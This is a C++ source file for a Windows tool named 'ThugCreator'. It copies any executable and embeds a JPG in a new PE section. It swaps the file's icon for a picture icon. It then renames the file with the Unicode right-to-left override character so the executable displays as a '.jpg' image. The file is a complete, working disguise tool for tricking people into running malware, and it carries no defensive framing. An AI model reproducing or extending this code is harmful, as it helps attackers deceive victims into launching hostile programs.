#include <windows.h>
#include <stdio.h>

import PE;
import FileLoader;
import ExeIconReplacer;

using namespace rozen::PE;
using namespace rozen::FileLoader;
using namespace rozen::iconreplacer;

int main(int argc, char* argv[])
{
	//read input parameters
	if (argc < 5)
	{
		printf("Usage: ThugCreator <input_exe> <output_exe> <picture_jpg> <picture.ico>\n");
		return 1;
	}

	const char* szInputExe = argv[1];
	const char* szOutputExe = argv[2];
	const char* szPictureJpg = argv[3];
	const char* szPictureIco = argv[4];

	//read the directory where the input exe is located
	char szWorkingDir[MAX_PATH] = { 0 };
	char szPicturePath[MAX_PATH] = { 0 };
	char szOutputPath[MAX_PATH] = { 0 };
	char szIconPath[MAX_PATH] = { 0 };

	GetModuleFileNameA(NULL, szWorkingDir, MAX_PATH);

	//remove the exe name from the path and add the input exe name. Use safe functions
	char* p = strrchr(szWorkingDir, '\\');
	if (p)
	{
		*(p + 1) = 0;
	}
	else
	{
		szWorkingDir[0] = 0;
	}

	strcat_s(szIconPath, MAX_PATH, szWorkingDir);
	strcat_s(szIconPath, MAX_PATH, szPictureIco);
	strcat_s(szPicturePath, MAX_PATH, szWorkingDir);
	strcat_s(szOutputPath, MAX_PATH, szWorkingDir);
	strcat_s(szPicturePath, MAX_PATH, szPictureJpg);
	strcat_s(szWorkingDir, MAX_PATH, szInputExe);
	strcat_s(szOutputPath, MAX_PATH, szOutputExe);

	//copy the input exe to the output exe
	if (!CopyFileA(szWorkingDir, szOutputPath, FALSE))
	{
		printf("Failed to copy input exe to output exe\n");
		return -1;
	}

	FileLoader fl;

	if (!fl.LoadFile(szPicturePath))
	{
		printf("Failed to load picture file\n");
		return -1;
	}

	PE pe;

	if (!pe.LoadPEHeader(szOutputPath))
	{
		printf("Failed to load PE header\n");
		return -1;
	}

	constexpr auto THUG_SECTION_NAME = "thugsect";

	if(!pe.WritePESection(szOutputPath, THUG_SECTION_NAME, (BYTE *)fl.GetBuffer(), fl.GetPicSize()))
	{
		printf("Failed to write PE section\n");
		return -1;
	}

	//convert szOutputPath to unicode array
	wchar_t wszOutputPath[MAX_PATH] = { 0 };
	wchar_t wszIconPath[MAX_PATH] = { 0 };
	wchar_t wszCopyOutputPath[MAX_PATH] = { 0 };
	MultiByteToWideChar(CP_ACP, 0, szOutputPath, -1, wszOutputPath, MAX_PATH);
	MultiByteToWideChar(CP_ACP, 0, szIconPath, -1, wszIconPath, MAX_PATH);

	if(!ReplaceIconOfExeFile(wszOutputPath, wszIconPath, 1, 1))
	{
		printf("Failed to replace icon of exe file\n");
		return -1;
	}

	//copy name of output exe to wszCopyOutputPath
	wcscpy_s(wszCopyOutputPath, MAX_PATH, wszOutputPath);

	//remove exe extension
	wchar_t* pExt = wcsrchr(wszOutputPath, L'.');
	if (pExt)
	{
		*pExt = 0;
	}

	//add to wszOutputPath the character 0x202e and a string .jpg
	wchar_t wszOutputPathJpg[MAX_PATH] = { 0 };
	wsprintfW(wszOutputPathJpg, L"%s\x202egpj.exe", wszOutputPath);

	//rename the output exe to the new name
	if (!MoveFileEx(wszCopyOutputPath, wszOutputPathJpg, MOVEFILE_REPLACE_EXISTING))
	{
		printf("Failed to rename output exe\n");
		return -1;
	}

	return 0;
}
